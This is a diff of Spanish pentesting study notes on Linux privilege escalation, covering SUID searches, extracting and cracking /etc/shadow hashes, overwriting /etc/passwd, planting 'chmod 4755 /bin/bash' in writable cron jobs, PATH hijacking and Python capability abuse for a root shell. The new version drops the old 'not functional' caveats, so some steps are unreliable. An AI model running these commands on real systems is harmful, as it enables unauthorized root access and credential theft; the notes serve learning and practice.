@@ -5,57 +5,175 @@ Aclarar que las explotaciones que se muestran, en la gran mayoria, ya no son fun
 Por lo tanto, estos metodos se deben de tomar como simple práctica y conocimiento básico.
 
 
-EXLOTACIÓN Y ABUSO DE LOS PRIVILEGIOS 
-    
--find \-perm -4000 (2>/dev/null) -> Para buscar quien tiene privilegios SUID (los directorios a los que no pueda acceder se redirijen hacia /dev/null).
--cat /etc/shadow | grep "ENCRYPT_METHOD" -> Para mostrar el metodo de encritado de las passwords de los usuarios -> Con una wordlist como rockyou.
--cat /etc/shadow | grep raul > hash -> Cojes la contraseña encriptada del usuario raul.
--john --wordlist=rockyou.txt hash -> Para romper la contraseña hash podemos utilizar john con el wordlist rockyou.
--find \-writable (2>/dev/null) | grep "etc" -> Filtramos por los archivos que se puedan escribir como "otros" y ademas ponemos un filtro para el directorio /etc
-que es critica.
-Si podemos escribir en /etc/passwd y cambiamos la X (contraseña hasheada) y ponemos nostros un hash que hemos creado con anterioridad con openssl pssword 
-(tiene que ser del tipo DES(Unix) se puede comprobar con hash-identifier o hashid), después cuando hagamos sudo su y nos pida la contraseña de root podremos
-ganar acceso poniendo poniendo la contraseña sin hashear que hemos sustituido en /etc/passwd. (NO COMPROVADO)
+### Explotación y Abuso de Privilegios
 
-DETECCIÓN DE TAREAS CRON A TRAVES DE UN SCRIPT EN BASH
+**Descripción:**
+Explotar archivos y servicios con privilegios SUID y detectar archivos críticos con permisos de escritura.
 
--ps -eo command -> lista los comandos que se estan ejecutando en tiempo real -> con esto creamos un script para que nos muestre por pantalla los comandos que se van 
-ejecutando en cada momento (diff entre los viejos y los nuevos), y aplicamos un filtro para ver solo lo que nos interesa (en este caso las tareas cron que se estan
-ejecutando). Seguidamente miraremos si algunas de estas tareas es writable por otros, y si lo es, modificaremos el archivo para que ejecute:
--chmod 4755 /bin/bash -> de esta manera cuando el sistema ejecute el archivo cron dará privilegios SUID a la bash, de forma que "otros" podran ganar acceso a la shell
-con el comando:
--bash -p -> donde -p es una flag de seguridad necesaria para hacer uso de los privilegios SUID. (NO FUNCIONAL)
+**Proceso de Explotación:**
 
+1. **Búsqueda de Archivos con Privilegios SUID:**
+   - Buscar archivos con privilegios SUID y redirigir errores a `/dev/null`:
+     ```bash
+     find / -perm -4000 2>/dev/null
+     ```
 
-EXLOTACIÓN DE UN PATH HIJACKING FRENTE A UN BINARIO SUID
+2. **Obtención del Método de Encriptado de Contraseñas:**
+   - Mostrar el método de encriptado de las contraseñas de los usuarios:
+     ```bash
+     cat /etc/shadow | grep "ENCRYPT_METHOD"
+     ```
 
-Primeramente, programaremos un pequeño programa en c que lo unico que hace es ejecutar un par de llamadas a sistema. En c como medida de segurida nos obliga a
-declarar setuid(0) para que lo podamos ejecutar con los privilegios SUID cuando usamos un usuario no propietario (otros).
--echo $PATH -> Nos mostrara las diferentes rutas por la que busca los comandos que ejecutamos. Por eso cuando hacemos la llamada a sistema whoami nos devuelve
-lo mismo que si lo hacemos por la ruta aboluta /usr/bin/whoami. Por tanto, que pasará si creamos un archivo llamado whoami en una ruta más prioritaria que
-/usr/bin? Al no ejecutarlo con la ruta absoluta el sistema encontraría antes el whoami que hemos creado.
--export PATH=.:$PATH -> Este comando se utiliza para modificar la prioridad de las rutas, en este caso se esta poniendo la ruta actual como la más prioritaria
-(.) aunque podemos poner cualquier ruta. Estos cambios son temporales por cada sesión.
--strings backup (binario) -> Con strings se nos permite mostrar las cadenas de caracteres de un binario para de esta forma poder averiguar que comandos se estan 
-ejecutando y si se esta haciendo desde una ruta absoluta o no.
-Esto mismo se puede utilizar para lanzar una shell como root. Ya que el ejecutable del programa c tiene privilegios SUID, modificaremos $PATH para que la ruta más 
-prioritaria sea /tmp donde tendremos un script que lanza una shell (bash -p). Por lo tanto, cuando se ejecute el programa en c y se haga la llamada a sistema ps 
-utilizando la ruta relativa realmente se estará ejecutando nuestro script de la shell y ganaremos acceso a root. (NO FUNCIONAL)
+3. **Extracción del Hash de Contraseña:**
+   - Extraer la contraseña encriptada de un usuario específico (ej. `raul`):
+     ```bash
+     cat /etc/shadow | grep raul > hash
+     ```
 
+4. **Crackeo de Contraseñas con John the Ripper:**
+   - Utilizar John the Ripper con la wordlist `rockyou.txt` para romper el hash:
+     ```bash
+     john --wordlist=rockyou.txt hash
+     ```
 
-EXPLOTACIÓN Y ABUSO DE LAS CAPABILITIES EN LINUX
+5. **Búsqueda de Archivos Escribibles en Directorios Críticos:**
+   - Filtrar por archivos que se pueden escribir en el directorio `/etc`:
+     ```bash
+     find / -writable 2>/dev/null | grep "etc"
+     ```
 
-Hay veces que es un tanto desafiante convertirse en root y no merece la pena. Existe otra alternativa, lo que se conoce como persistencias. Otra cosa que podriamos
-hacer para pasar más desapercibidos es mediante la explotación y el abuso de las capabilities.
--getcap -r / 2>/dev/null -> Para mostrar las capabilities que hayan definidas a nivel de sistema en la raiz de forma recursiva, 2>/dev/null lo utilizamos para un
-mejor filtraje al eliminar el stder (ya que habrá rutas a las que no tenga acceso al no ser root).
--setcap cap_setuid+ep /usr/bin/python3.8 -> Le asignamos a python3.8 la capability del setuid+ep (utilizada más adelante para poder poner el setuid(0)).
--setcap -r cap_setuid+ep /usr/bin/python3.8 -> Con -r le quitamos la capability
--python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")' -> -c quiere decir desde una consola interactiva en un 'one liner', se importa la libreria os y
-atraves de un atributo de os que es setuid(0) le indiacamos que queremos operar con el id=0 (root) y seguidamente, atraves de otro atributo de os, indicamos que 
-queremos hacer una llamada al sistema y abrir una bash.
-Hay muchos tipos de capabilities que nos permiten explotar diferentes servicios para ganar acceso a root. En iternet se pueden buscar. Ej GTFOBins. (NO FUNCIONAL)
+6. **Modificación del Archivo `/etc/passwd`:**
+   - Si es posible escribir en `/etc/passwd`, cambiar la contraseña hasheada (X) por un hash generado previamente:
+     ```bash
+     openssl passwd -1 -salt <salt> <password>
+     ```
 
+7. **Acceso a la Cuenta Root:**
+   - Usar `sudo su` y proporcionar la contraseña sin hashear para ganar acceso root.
+
+---
+
+### Detección de Tareas Cron a Través de un Script en Bash
+
+**Descripción:**
+Detectar tareas cron y abusar de archivos cron con permisos de escritura para escalar privilegios.
+
+**Proceso de Explotación:**
+
+1. **Listar Comandos en Ejecución:**
+   - Utilizar `ps` para listar todos los comandos que se están ejecutando en tiempo real:
+     ```bash
+     ps -eo command
+     ```
+
+2. **Creación de un Script de Monitoreo:**
+   - Crear un script bash para mostrar comandos en ejecución, filtrando específicamente tareas cron:
+     ```bash
+     #!/bin/bash
+
+     old=$(ps -eo command)
+     while true; do
+         new=$(ps -eo command)
+         diff <(echo "$old") <(echo "$new")
+         old=$new
+         sleep 1
+     done
+     ```
+
+3. **Detección de Archivos Cron Escribibles:**
+   - Verificar si alguna de las tareas cron es escribible por otros:
+     ```bash
+     find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null
+     ```
+
+4. **Modificación del Archivo Cron:**
+   - Modificar el archivo cron escribible para asignar privilegios SUID a la bash:
+     ```bash
+     echo "chmod 4755 /bin/bash" >> /ruta/del/archivo/cron
+     ```
+
+5. **Ejecutar Bash con Privilegios SUID:**
+   - Cuando el sistema ejecute el archivo cron, obtener una shell con privilegios SUID:
+     ```bash
+     bash -p
+     ```
+
+---
+
+### Explotación de un Path Hijacking Frente a un Binario SUID
+
+**Descripción:**
+Aprovechar la vulnerabilidad de path hijacking en un binario SUID para ejecutar comandos maliciosos con privilegios elevados.
+
+**Proceso de Explotación:**
+
+1. **Preparación del Entorno:**
+   - Mostrar las diferentes rutas por las que el sistema busca los comandos:
+     ```bash
+     echo $PATH
+     ```
+
+2. **Creación de un Archivo Ejecutable Malicioso:**
+   - Crear un archivo llamado `whoami` en una ruta más prioritaria que `/usr/bin`:
+     ```bash
+     export PATH=.:$PATH
+     ```
+
+3. **Inspección del Binario SUID:**
+   - Utilizar `strings` para mostrar las cadenas de caracteres del binario y averiguar qué comandos se están ejecutando:
+     ```bash
+     strings backup
+     ```
+
+4. **Modificación de la Prioridad de las Rutas:**
+   - Modificar la prioridad de las rutas para que la ruta actual sea la más prioritaria:
+     ```bash
+     export PATH=/tmp:$PATH
+     ```
+
+5. **Creación de un Script para Obtener una Shell:**
+   - Crear un script en `/tmp` que lance una shell:
+     ```bash
+     echo "bash -p" > /tmp/ps
+     chmod +x /tmp/ps
+     ```
+
+6. **Ejecución del Binario SUID:**
+   - Ejecutar el binario SUID y obtener una shell con privilegios elevados.
+
+---
+
+### Explotación y Abuso de las Capabilities en Linux
+
+**Descripción:**
+Aprovechar las capabilities en Linux para obtener privilegios elevados de manera sigilosa.
+
+**Proceso de Explotación:**
+
+1. **Listado de Capabilities en el Sistema:**
+   - Mostrar las capabilities definidas a nivel de sistema:
+     ```bash
+     getcap -r / 2>/dev/null
+     ```
+
+2. **Asignación de Capabilities a un Binario:**
+   - Asignar la capability `cap_setuid+ep` a `python3.8`:
+     ```bash
+     setcap cap_setuid+ep /usr/bin/python3.8
+     ```
+
+3. **Ejecución de un Comando con Privilegios Elevados:**
+   - Utilizar `python3.8` para ejecutar una shell como root:
+     ```bash
+     python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+     ```
+
+4. **Remoción de la Capability:**
+   - Quitar la capability asignada a `python3.8`:
+     ```bash
+     setcap -r cap_setuid+ep /usr/bin/python3.8
+     ```
+     
 ---
 
 ## PENTESTING: 5 fases
